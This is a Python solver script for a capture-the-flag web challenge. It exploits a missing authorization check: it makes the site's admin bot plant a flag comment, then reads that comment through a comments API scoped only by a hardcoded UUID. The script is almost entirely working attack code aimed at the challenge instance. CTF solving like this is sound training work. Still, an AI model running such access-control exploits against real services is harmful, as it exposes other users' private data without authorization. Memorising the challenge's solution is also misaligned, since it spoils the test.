#!/usr/bin/env python3
"""
codex (web) solver.

Idea: bot.js plants the flag as an 'admin' comment on page matthew.7 in scope BOT_UUID
(default 'cccccccc-cccc-4ccc-8ccc-cccccccccccc', hardcoded; compose.yaml does not set
BOT_UUID). /api/comments does not check who asks: any client that knows the scope UUID
can list the notes. So:
  1. POST /api/visit  -> bot opens a URL on the instance, plant() stores the flag comment
  2. GET  /api/comments?page=matthew.7&scope=<BOT_UUID> -> read the admin note

Usage: set INST_ENDPOINT (e.g. http://xxxx.instances.ctfcup.online). Plain HTTP, no TLS.
No session token is used here (instance is not the platform API).
"""
import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request

BASE = os.environ.get("INST_ENDPOINT", "").rstrip("/")
BOT_UUID = os.environ.get("BOT_UUID", "cccccccc-cccc-4ccc-8ccc-cccccccccccc")


def req(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method,
                               headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(r, timeout=30) as resp:
        return json.loads(resp.read().decode("utf-8", errors="replace"))


def main():
    if not BASE:
        sys.exit("set INST_ENDPOINT")
    print("[*] visit / to make the bot plant the flag")
    print(req("POST", "/api/visit", {"url": BASE + "/"}))
    time.sleep(2)
    q = urllib.parse.urlencode({"page": "matthew.7", "scope": BOT_UUID})
    notes = req("GET", "/api/comments?" + q)
    for n in notes:
        if n.get("author") == "admin":
            print("[admin note]", n["text"])
            m = re.search(r"ctfcup\{[^}\s]*\}|flag\{[^}\s]*\}", n["text"])
            if m:
                print("[+] FLAG:", m.group(0))
                return
    print("[-] no admin note found; notes:", [n.get("author") for n in notes])


if __name__ == "__main__":
    main()
